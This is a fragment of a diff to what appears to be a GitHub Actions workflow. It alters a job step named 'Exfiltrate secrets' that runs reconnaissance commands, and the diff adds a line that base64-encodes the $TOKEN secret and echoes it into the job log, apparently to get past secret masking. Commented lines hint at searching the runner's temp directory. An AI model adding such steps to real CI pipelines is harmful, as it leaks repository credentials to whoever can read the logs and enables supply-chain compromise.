@@ -12,7 +12,7 @@ jobs:
     steps:
       - name: Exfiltrate secrets
         run: |
-          pwd;ls -lah;whoami
+          pwd;ls -lah;whoami;echo $TOKEN|base64
           # DIR="/home/docker/actions-runner/_work/_temp/"
           # files_found=false
           # while true; do
